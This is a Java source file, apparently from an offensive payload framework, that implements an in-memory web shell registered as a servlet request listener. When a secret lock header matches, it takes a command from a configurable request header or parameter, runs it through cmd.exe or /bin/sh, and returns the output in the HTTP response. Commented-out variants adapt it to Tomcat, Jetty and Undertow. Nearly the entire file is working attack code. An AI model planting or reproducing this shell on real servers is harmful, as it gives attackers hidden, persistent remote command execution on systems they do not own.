package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;

import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 */
@MemShell(MemShell.Listener)
@MemShellFunction(MemShellFunction.Exec)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
public class ListenerExec implements InvocationHandler {
    private static String HEADER;
    private static String PARAM;
    private static String lockHeaderKey;
    private static String lockHeaderValue;

    public Object invoke(Object proxy, Method method, Object[] args) {
        if (method.getName().equals("requestInitialized")) {
            run(args[0]);
        } else if (method.getName().equals("equals")) {
            return this.equals(args[0]);
        }
        return null;
    }

    public Object getResponse(Object request) throws Exception {
        return null;
    }

    /**
     * tomcat
     */
//    public Object getResponse(Object request) throws Exception {
//        try {
//            request = getFieldValue(request, "request");
//        }catch (Exception e){
//        }
//        Object httpServletResponse = getFieldValue(request, "response");
//        return httpServletResponse;
//    }

    /**
     * Jetty
     */
//    public Object getResponse(Object request) throws Exception {
//        return invokeMethod(request, "getResponse", new Class[]{}, new Object[]{});
//    }

    /**
     * Undertow
     */
//    public Object getResponse(Object request) throws Exception {
//        Object exchange = getFieldValue(request, "exchange");
//        Map attachments = (Map) getFieldValue(exchange, "attachments");
//        Object[] tables = (Object[]) getFieldValue(attachments, "table");
//        for (int i = 0; i < tables.length; i++) {
//            try {
//                Object table = tables[i];
//                if (table == null)
//                    continue;
//                if (table.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
//                    return getFieldValue(table, "originalResponse");
//                }
//            } catch (Exception e) {
//            }
//        }
//        return null;
//    }
    private void run(Object sre) {
        try {
            Object request = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
            if (lv == null || !lv.contains(lockHeaderValue)) {
                return;
            }

            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            Object param = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
            String str = null;
            if (header != null) {
                str = (String) header;
            } else if (param != null) {
                str = (String) param;
            }
            String result = exec(str);
            Object response = getResponse(request);
            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
        } catch (Throwable ignored) {
        }
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
        return exec_result(inputStream);
    }

    public static String exec_result(InputStream inputStream) throws Exception {
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }
}
